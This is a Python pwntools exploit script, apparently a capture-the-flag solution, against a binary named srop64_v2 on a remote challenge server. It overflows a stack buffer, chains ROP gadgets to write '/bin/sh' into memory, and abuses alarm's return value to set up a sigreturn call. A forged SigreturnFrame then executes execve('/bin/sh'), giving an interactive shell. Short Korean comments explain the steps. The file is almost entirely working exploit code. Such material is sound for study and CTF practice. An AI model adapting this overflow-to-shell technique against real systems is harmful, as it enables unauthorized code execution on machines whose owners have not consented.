from pwn import *
context.arch = "amd64"
def slog(title, context): log.success(f'{title} : {hex(context)}')

p = remote("realsung.kr", 13339)
# p = process('./srop64_v2')
e = ELF("./srop64_v2")
libc = ELF("./libc.so.6")

sa = lambda x, y : p.sendafter(x, y)
sla = lambda x, y : p.sendlineafter(x, y)
s = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
rvl = lambda : p.recvline()
rvu = lambda x : p.recvuntil(x)

pop_rdi = 0x00000000004006a3
syscall = 0x000000000040063e
gets = e.sym['gets']
alarm = e.sym['alarm']
binsh = e.bss() + 0x100

slog('gets', gets)
slog('alarm', alarm)

payload = b''
payload += b'A' * 0x30 + b'B' * 0x8

payload += p64(pop_rdi)
payload += p64(binsh) # 이 파일에는 /bin/sh가 없음 직접 넣어줘야함
payload += p64(gets)

payload += p64(pop_rdi) # alarm은 보내고 바로 다음에 보내는 순간 전에 있던 rdi인자를 eax로 리턴함
payload += p64(0xf) # 맨 처음 인자 0xf -> sigreturn
payload += p64(alarm)
payload += p64(pop_rdi)
payload += p64(0xFFFFFFFF) # 두번째 아무거나 보내도 됨
payload += p64(alarm)
payload += p64(syscall)

frame = SigreturnFrame()
frame.rip = syscall
frame.rax = 0x3b
frame.rdi = binsh

payload += bytes(frame)

sl(payload)

sl(b'/bin/sh\x00')

p.interactive()